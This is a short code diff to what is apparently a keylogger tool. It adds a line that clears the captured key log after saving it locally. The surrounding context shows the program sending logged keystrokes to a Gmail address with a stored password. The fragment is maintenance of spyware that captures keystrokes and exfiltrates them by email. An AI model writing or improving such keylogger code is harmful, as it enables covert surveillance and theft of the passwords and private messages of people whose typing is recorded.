@@ -42,6 +42,7 @@ class main:
             if key_log != "":
                 if self.gmail == "":
                     exporter.save_text_locally(key_log, self.export_path)
+                    self.keylogger.clear_key_log()
                 else:
                     if exporter.send_gmail(key_log, self.gmail, self.gmail_pass):
                         self.keylogger.clear_key_log()
